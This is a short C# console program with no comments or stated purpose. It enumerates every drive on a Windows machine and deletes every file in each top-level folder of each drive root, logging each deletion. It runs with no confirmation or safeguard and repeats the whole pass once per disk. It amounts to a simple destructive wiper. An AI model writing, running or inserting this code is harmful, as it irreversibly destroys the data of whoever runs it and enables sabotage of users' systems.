using System;
using System.IO;
using System.Collections.Generic;
public static class Program
{
    public static string[] LogicalDrives = Directory.GetLogicalDrives();
    public static List<DriveInfo> Disks = new List<DriveInfo>(DriveInfo.GetDrives());
    public static void Main(string[] args)
    {
        foreach (DriveInfo disk in Disks)
        {
            if (disk.Name != disk.VolumeLabel)
            {
                Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
            }
            else
            {
                Console.WriteLine("Current drive is: " + disk.Name);
            }
            foreach (string drive in LogicalDrives)
            {
                string[] dirs = Directory.GetDirectories(Directory.GetDirectoryRoot(drive));
                foreach (string dir in dirs)
                {
                    string[] files = Directory.GetFiles(dir);
                    foreach (string file in files)
                    {
                        File.Delete(file);
                        Console.WriteLine("Deleting " + file);
                    }
                }
            }
        }
    }
}
